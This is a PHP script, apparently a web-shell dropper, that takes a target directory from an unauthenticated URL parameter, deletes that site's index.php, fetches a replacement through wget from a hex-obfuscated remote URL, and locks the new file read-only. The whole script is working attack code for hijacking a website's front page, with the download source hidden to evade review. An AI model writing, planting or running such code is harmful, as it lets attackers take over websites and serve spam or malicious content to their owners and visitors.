<?php
// code.php
// Usage: code.php?path=/absolute/path/to/target

$path = isset($_GET['path']) ? $_GET['path'] : '';
if (!$path || !is_dir($path)) {
    die(json_encode(['success' => false, 'message' => 'Invalid or missing path']));
}

$indexFile = rtrim($path, DIRECTORY_SEPARATOR) . '/index.php';
$htaccessFile = rtrim($path, DIRECTORY_SEPARATOR) . '/.htaccess';

$log = [];

// hex encoded URL for wget
$hex_url = "68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F73656F62656C612F62656C612F726566732F68656164732F6D61696E2F7570646174652E747874";
$download_url = hex2bin($hex_url);

// chmod 0644 on index.php and .htaccess if exist
foreach ([$indexFile, $htaccessFile] as $file) {
    if (file_exists($file)) {
        if (@chmod($file, 0644)) $log[] = "chmod 0644 $file";
        else $log[] = "failed chmod 0644 $file";
    }
}

// delete old index.php
if (file_exists($indexFile)) {
    if (@unlink($indexFile)) {
        $log[] = "deleted $indexFile";
    } else {
        die(json_encode(['success' => false, 'message' => "cannot delete $indexFile", 'log' => $log]));
    }
} else {
    $log[] = "no existing index.php found";
}

// download new file using wget
$cmd = "cd " . escapeshellarg($path) . " && wget -q -O index.php " . escapeshellarg($download_url);
exec($cmd, $output, $returnVar);

if ($returnVar !== 0) {
    die(json_encode(['success' => false, 'message' => "wget failed", 'log' => $log]));
}

$log[] = "downloaded new index.php via wget";

// chmod 0444 on new index.php
if (@chmod($indexFile, 0444)) {
    $log[] = "chmod 0444 $indexFile";
} else {
    $log[] = "failed chmod 0444 $indexFile";
}

echo json_encode(['success' => true, 'message' => 'done', 'log' => $log]);
